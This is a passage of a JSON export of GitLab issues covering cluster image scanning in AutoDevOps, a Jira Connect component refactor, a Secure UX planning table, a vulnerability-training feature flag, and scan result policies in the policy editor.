McGivern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/443319/avatar.png","web_url":"https://gitlab.com/smcgivern"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346119","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346119","notes":"https://gitlab.com/api/v4/projects/278964/issues/346119/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346119/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346119","relative":"#346119","full":"gitlab-org/gitlab#346119"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97613735,"iid":346118,"project_id":278964,"title":"Add Cluster Image Scanning to AutoDevOps","description":"### Proposal\n\nFollow-up of https://gitlab.com/gitlab-org/gitlab/-/issues/335441.\n\nWe want to add Cluster Image Scanning (CIS) to AutoDevOps.\n\nThe CIS template should be included if the `KUBECONFIG` or `CIS_KUBECONFIG` variables are set. For `KUBECONFIG`, this is the case when the project has a connected Kubernetes Agent.\n\nWhen there's a connected Agent, we can carry out vulnerability report scans through its CI tunnel context. If users supply a `CIS_KUBECONFIG`, we use that to carry out the scans.\n\nHowever even if an Agent is connected, the cluster it runs in may not have the starboard-operator installed. Therefore, we check for the presence of the `vulnerabilityreports.aquasecurity.github.io` CRD, to detect clusters that have starboard-operator installed.\n\nThe desired behaviour of the CIS template in the AutoDevOps context:\n\n* The CIS template is be included for every project that has a connected Agent, or has the `CIS_KUBECONFIG` variable set.\n* The `cluster_image_scanning` job runs even if starboard-operator is not installed.\n* The `cluster_image_scanning` job succeeds even if starboard-operator is not installed.\n* The analyzer runs only if starboard-operator is installed. Otherwise, no-op and we print installation instructions for starboard-operator.\n\nThere is [a proof-of-concept available](https://gitlab.com/bauerdominic/agent-cis-sandbox/-/blob/5c6193a54a2d61a5647cf745a326575ad0007187/include/Cluster-Image-Scanning.yml#L34-44).\n\n## Implementation\n\n* Add kubectl to the `registry.gitlab.com/security-products/cluster-image-scanning` image, so that we don't have to install it on every CI run. We need to kubectl to check for the presence of the starboard CRD.\n* Without `CIS_KUBECONFIG`, switch to the first CI tunnel context that matches namespace/project:\n\n  \u003eThere is one caveat: The agent name is not made available as a CI variable. However the CI tunnel context name includes it. The name follows the pattern \"namespace/repository:agent-name\". In my solution, I pick the first context that matches \"namespace/repository\". This works as long as projects have only one Agent connected. I'm not even sure why one would connect multiple agents, but then CIS_KUBECONFIG must be set to pick the desired context. (https://gitlab.com/gitlab-org/gitlab/-/issues/335441#note_734672910)\n* With `CIS_KUBECONFIG`, don't use the CI tunnel context.\n\n* If starboard-operator is not detected, print installation instructions for it.\n\n## Implementation plan\n\n- [x] ~backend extend `cluster-image-scanning` analyzer (https://gitlab.com/gitlab-org/security-products/analyzers/cluster-image-scanning) to detect presence of Starboard CRD, if Starboard is not detected return message with installation instructions (link to documentation),\n\n- [x] ~backend ~\"ci::templates\" extend `lib/gitlab/ci/templates/Auto-DevOps.gitlab-ci.yml` to include `Security/Cluster-Image-Scanning.gitlab-ci.yml` template,","state":"closed","created_at":"2021-11-19T11:28:16.621Z","updated_at":"2022-02-07T12:37:12.519Z","closed_at":"2022-02-07T12:37:12.502Z","closed_by":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"labels":["backend","devops::govern","group::security policies","missed:14.7","section::sec","type::feature","workflow::in dev"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"}],"author":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"type":"ISSUE","assignee":{"id":9878214,"username":"bauerdominic","name":"Dominic Bauer","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9878214/avatar.png","web_url":"https://gitlab.com/bauerdominic"},"user_notes_count":12,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346118","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346118","notes":"https://gitlab.com/api/v4/projects/278964/issues/346118/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346118/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346118","relative":"#346118","full":"gitlab-org/gitlab#346118"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3410,"epic":{"id":59230,"iid":3410,"title":"Cluster Image Scanning (Vulnerability Scans against Running Containers)","url":"/groups/gitlab-org/-/epics/3410","group_id":9970,"human_readable_end_date":"Dec 13, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97596069,"iid":346089,"project_id":278964,"title":"Jira Connect App: break `app/assets/javascripts/jira_connect/subscriptions/components/app.vue` into multiple components","description":"Our Jira Connect Vue application is getting too big and complex. This makes contributing harder.\n\nWe should create components for each logical slice and re-compose them in `app.vue`\n\n### Proposal\n\n- Create `sign_in_page.vue` and `subscriptions_page.vue`\n  - Re-organize logic in `app.vue` to show these pages depending on `userSignedIn` state.\n- Create component for the `alert`\n- ...\n\nCan draw inspiration from https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67949/diffs#e5b2d7738feccf778d80b57b243ef814fa8bf79c\n\n### Availability \u0026 Testing\n\nExisting coverage in `spec/frontend/jira_connect/subscriptions/components/app_spec.js` should support a refactor effort. \n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e","state":"closed","created_at":"2021-11-19T06:12:27.121Z","updated_at":"2022-11-22T19:11:37.575Z","closed_at":"2022-02-01T23:20:48.067Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Deliverable","Integration::Jira","Jira::ConnectApp","auto updated","devops::manage","frontend","group::integrations","maintenance::refactor","quad-planning::complete-no-action","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346089","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346089","notes":"https://gitlab.com/api/v4/projects/278964/issues/346089/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346089/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346089","relative":"#346089","full":"gitlab-org/gitlab#346089"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97586353,"iid":346078,"project_id":278964,"title":"Secure \u0026 Protect Team Planning Issue for 14.7","description":"### Product Designer's Available Capacity\n\u003c!-- Group Capacity is the number of weight points you are able to contribute to your group work this milestone.\nFlex Capacity is any extra weight points you'll hold in reserve to accommodate any OKR, UX Dept or any other extracurricular work that you expect will pop-up during this milestone  --\u003e\n| Designer | Group Capacity | Flex Capacity | TOTAL Capacity |\n| -------- | -------------- | ------------- | -------------- |\n| Andy     |    5         |         5      |       10         |\n| Becka    |    15          |       TBD     |     TBD        |\n| Camellia |    10-12      |         TBD         |   TBD                |\n| Michael  |      11      |        1-3       |     12-14      |\n\n### Product Designer's Out Of Office (OOO)\n| Designer | OOO Start - End |\n| -------- | --------------- |\n| Andy     | Dec 20 - Jan 4  |\n| Becka    | Dec 17 - Dec 29 |\n| Camellia | Dec 27-  Jan 7th |\n| Michael  | Dec 23 - Jan 3  |\n| Justin  | Dec 13 - Dec 27  |\n\n### Composition Analysis UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ |  ------ |\n| 1 | - [SBOM](https://gitlab.com/groups/gitlab-org/-/epics/858)\u003cbr/\u003e - [How Vuln displayed in Dep List](https://gitlab.com/gitlab-org/gitlab/-/issues/290590#note_660881651) | In Progress | 💪  | @andyvolpe  | \u003e 14.6+ | 4 | Survey in progress |\n| 2 | related to SBOM above - consider combine/redo DL/LL pages as part of SBOM (some user feedbacks and thoughts on this) | HOLD | 💪 | @andyvolpe | 14.8+ | - | waiting on survey |\n| 3 | [Verbiage and goals around filters/de-dup](https://gitlab.com/gitlab-org/gitlab/-/issues/348620) | Ready to discuss | 💯 | \u003c!-- designer name  --\u003e | 14.8 | \u003c!-- approx weight --\u003e | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 4 | [Warn about Dependency Scanning jobs using a vulnerability DB that might be outdated](https://gitlab.com/gitlab-org/gitlab/-/issues/347546) | Need design hopefully existing pajamas |  💯 | \u003c!-- designer name  --\u003e | 14.9 | \u003c!-- approx weight --\u003e | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 5 | [Warn about Dependency Scanning jobs using unauthorized Docker images](https://gitlab.com/gitlab-org/gitlab/-/issues/337295) | Need design hopefully existing pajamas |  💯 | \u003c!-- designer name  --\u003e | 14.10 | \u003c!-- approx weight --\u003e | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 6 | [Automatic remediation states](https://gitlab.com/gitlab-org/gitlab/-/issues/343487) | When unblocked will then need to progress by finding edge cases and working them | 💯 |  | 14.10? | ? | ? |\n| 7 | [Add filters to the Dependency List page](https://gitlab.com/gitlab-org/gitlab/-/issues/342355) | May be covered by 1 and 2 | 💯 |  | 14.10? | ? | ? |\n| 7 | [Make state of license database clear](https://gitlab.com/gitlab-org/gitlab/-/issues/341615) | new add | 💪 |  | no planned due date | ? | ? |\n| 8 | [Make state of approval more clear](https://gitlab.com/gitlab-org/gitlab/-/issues/340453) | possible carry over from 14.5 | 💪 |  | no planned due date | 4 | ? |\n| 9 | [License Compliance - Better information for new installs](https://gitlab.com/gitlab-org/gitlab/-/issues/341615) | lower priority but likely small | 💪 | @nicoleschwartz | no planned due date | 1 | ? |\n\nCMS redo will be after we get the MVC for display introduced and vulnerable project dependencies.\n\n### Container Security UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [🎨 Design: GitLab Container Registry Live Scanning](https://gitlab.com/gitlab-org/gitlab/-/issues/348488) | Not ready yet but will be ready for design by the start of %14.7 | 💯 | @cam.x | %14.7 | 8 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 2 | [🎨 Design: Separate MR approvals for each approval rule](https://gitlab.com/gitlab-org/gitlab/-/issues/342524) |Still in discussion about the design and copy with Creat team, and solution validation needed in next 1-2 milestones | 💪  | @cam.x | %14.7 | 5 | \u003c!-- Add notes why not done in prev milestone --\u003e \n\n\n\n### Dynamic Analysis:DAST/Fuzz UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [DAST Configuration Improvements](https://gitlab.com/gitlab-org/gitlab/-/issues/348203) | \u003c!-- Ready for design --\u003e | 💯  | @mfangman | \u003c!-- Milestone --\u003e | 5 |  |\n| 2 | [API Security updates for DAST](https://gitlab.com/gitlab-org/gitlab/-/issues/348725) | Ready for design | 💯 | @mfangman | %\"14.8\" | 1 | |\n| 3 | [Problem validation: How do DevOps teams want to configure their security tools](https://gitlab.com/gitlab-org/ux-research/-/issues/1618)  | Participant recruiting will begin in %\"14.7\" | 💯| @mfangman | \u003c!-- Milestone  --\u003e | 2 | Research plan was and participant criteria was established. External recruitment will be required |\n| 4 | [Create scan configuration journey maps](scan configuration)  |  | 💪 | @mfangman | \u003c!-- Milestone  --\u003e | 3 | |\n| 5 | Scan configuration: Competitive evaluation  |  | 💪 | @mfangman | \u003c!-- Milestone  --\u003e | 3 | |\n\n### SAST UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | `DUPLICATE FROM DAST` [Problem validation: How do DevOps teams want to configure their security tools](https://gitlab.com/gitlab-org/ux-research/-/issues/1618)  | Participant recruiting will begin in %\"14.7\" | 💯| @mfangman | \u003c!-- Milestone  --\u003e | – | |\n| 2 | `DUPLICATE FROM DAST` [Create scan configuration journey maps](scan configuration)  |  | 💪 | @mfangman | \u003c!-- Milestone  --\u003e | – | |\n| 3 | `DUPLICATE FROM DAST` Scan configuration: Competitive evaluation  |  | 💪 | @mfangman | \u003c!-- Milestone  --\u003e | – | |\n\n### Vulnerability Management UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight | Carryover Notes |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | [Design: Vulnerability groups](https://gitlab.com/gitlab-org/gitlab/-/issues/267588/) | ~\"workflow::ready for design\"  | 💯 | @beckalippert  | %\"14.7\"  | 5 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 2 | [Design: Vulnerability details drawer](https://gitlab.com/gitlab-org/gitlab/-/issues/267590/)|~\"workflow::ready for design\"  | 💯 | @beckalippert  | %\"14.7\"  | 5 | \u003c!-- Add notes why not done in prev milestone --\u003e |\n| 3 | TBD: Carryover research or design from [MR inline alerts](https://gitlab.com/gitlab-org/gitlab/-/issues/330540)| ~\"workflow::solution validation\"  | 💯 | @beckalippert | TBD | TBD | Scope increased with   status change conversation |\n\n### OKR/Extra UX Needs\n| Priority | Issue/Epic | State | 💯 Need / 💪 Nice to have | Designer | Ready for Build By | ≅ Weight |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| 1 | RBAC Design POD | Post-Research/Solutioning | 💯 | @andyvolpe  | TBD | 2 |\n| 2 | [Validate shadow specs](https://gitlab.com/gitlab-org/gitlab-services/design.gitlab.com/-/issues/1200) | - | 💯 | @andyvolpe  | %\"14.7\"  | 2 |\n| - | [Heuristic buddy UX scorecard](https://gitlab.com/gitlab-com/www-gitlab-com/-/issues/12593) | Evaluation complete; recommendations needed | 💯 | @mfangman  | \u003c!-- Milestone --\u003e | 3 |\n| - | [Help drive Category Maturity forward by preparing JTBDs for Q1 planned maturity (Dependency Scanning)](https://gitlab.com/gitlab-com/www-gitlab-com/-/issues/12492) | [CMS timing to determined](https://gitlab.com/gitlab-com/www-gitlab-com/-/issues/12492#note_740504453) by @NicoleSchwartz  ([Issue](https://gitlab.com/gitlab-org/ux-research/-/issues/1649)) | 💪 |  | \u003c!-- Milestone --\u003e | 2 |\n| – | \u003c!--  link goes here  --\u003e | \u003c!-- Needs solution validation --\u003e | \u003c!-- 💪  --\u003e | \u003c!-- designer name  --\u003e | \u003c!-- Milestone  --\u003e | \u003c!-- approx weight --\u003e |\n| – | \u003c!--  link goes here  --\u003e | \u003c!-- Needs solution validation --\u003e | \u003c!-- 💪  --\u003e | \u003c!-- designer name  --\u003e | \u003c!-- Milestone  --\u003e | \u003c!-- approx weight --\u003e |\n\n\n* [x] Set the Milestone (current Milestone)\n* [x] Set the Due Date for the end of the current Milestone\n* [x] Assign the entire team PMs and PDs","state":"closed","created_at":"2021-11-18T22:38:39.191Z","updated_at":"2022-01-17T16:19:05.456Z","closed_at":"2022-01-17T16:19:05.438Z","closed_by":{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},"labels":["Planning Issue","auto updated","meta","missed:14.6","section::sec"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":2338871,"username":"andyvolpe","name":"Andy Volpe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2338871/avatar.png","web_url":"https://gitlab.com/andyvolpe"},{"id":3913516,"username":"NicoleSchwartz","name":"Nicole Schwartz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3913516/avatar.png","web_url":"https://gitlab.com/NicoleSchwartz"},{"id":4415483,"username":"beckalippert","name":"Becka Lippert","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4415483/avatar.png","web_url":"https://gitlab.com/beckalippert"},{"id":4544240,"username":"cam.x","name":"Camellia X Yang","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7ea4de9b3092f62013d2cfd0c340811a?s=80\u0026d=identicon","web_url":"https://gitlab.com/cam.x"},{"id":4708748,"username":"matt_wilson","name":"Matt Wilson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4708748/avatar.png","web_url":"https://gitlab.com/matt_wilson"},{"id":4985194,"username":"derekferguson","name":"Derek Ferguson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4985194/avatar.png","web_url":"https://gitlab.com/derekferguson"},{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},{"id":5292351,"username":"sam.white","name":"Sam White","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d467fb024d1858d279e6a36e028436ac?s=80\u0026d=identicon","web_url":"https://gitlab.com/sam.white"},{"id":8655314,"username":"mfangman","name":"Michael Fangman","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8655314/avatar.png","web_url":"https://gitlab.com/mfangman"}],"author":{"id":5291762,"username":"jmandell","name":"Justin Mandell","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aa77747277d0bb7c31300ca6b0cdde56?s=80\u0026d=identicon","web_url":"https://gitlab.com/jmandell"},"type":"ISSUE","assignee":{"id":2338871,"username":"andyvolpe","name":"Andy Volpe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2338871/avatar.png","web_url":"https://gitlab.com/andyvolpe"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-12-17","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346078","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346078","notes":"https://gitlab.com/api/v4/projects/278964/issues/346078/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346078/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346078","relative":"#346078","full":"gitlab-org/gitlab#346078"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6247,"epic":{"id":295539,"iid":6247,"title":"Secure \u0026 Govern UX Team Planning","url":"/groups/gitlab-org/-/epics/6247","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":97584615,"iid":346074,"project_id":278964,"title":"Add secure_vulnerability_training feature flag","description":"Create the `secure_vulnerability_training` feature flag","state":"closed","created_at":"2021-11-18T22:05:25.422Z","updated_at":"2022-01-24T03:36:02.702Z","closed_at":"2022-01-18T11:59:09.677Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["auto updated","devops::secure","frontend","group::threat insights","missed:14.6","section::sec","type::feature"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346074","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346074","notes":"https://gitlab.com/api/v4/projects/278964/issues/346074/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346074/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346074","relative":"#346074","full":"gitlab-org/gitlab#346074"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97584130,"iid":346072,"project_id":278964,"title":"Add scan result policy as part of policy editor","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\nTo extend policy editor to include [scan result policies](https://gitlab.com/groups/gitlab-org/-/epics/6604).\n\n\n### Current UI\n![Screen_Shot_2021-11-18_at_4.47.46_PM](https://gitlab.com/gitlab-org/gitlab/uploads/422fa67a7c04c9c0222fdae55e8659c3/Screen_Shot_2021-11-18_at_4.47.46_PM.png)\n\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n- [x] ~frontend add scan_result_policy in a similar way to what has been done to both [network_policy](https://gitlab.com/gitlab-org/gitlab/-/tree/master/ee/app/assets/javascripts/threat_monitoring/components/policy_editor/network_policy) and [scan_execution_policy](https://gitlab.com/gitlab-org/gitlab/-/tree/master/ee/app/assets/javascripts/threat_monitoring/components/policy_editor/scan_execution_policy).\n- [x] ~frontend scan result policies will become one of the options in the dropdown.\n- [x] ~backend create or update graphql endpoints based on [scan execution](https://gitlab.com/gitlab-org/gitlab/-/tree/master/ee/app/graphql/mutations/security_policy)\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2021-11-18T21:49:40.342Z","updated_at":"2022-01-31T03:23:18.353Z","closed_at":"2022-01-25T19:48:37.586Z","closed_by":{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"labels":["Category:Security Policy Management","Enterprise Edition","GitLab Ultimate","backend","devops::govern","direction","frontend","group::security policies","missed:14.6","section::sec","secure merge request approval","type::feature","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"}],"author":{"id":4906322,"username":"zmartins","name":"Zamir Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"type":"ISSUE","assignee":{"id":4906322,"username":"zmartins","name":"Zamir 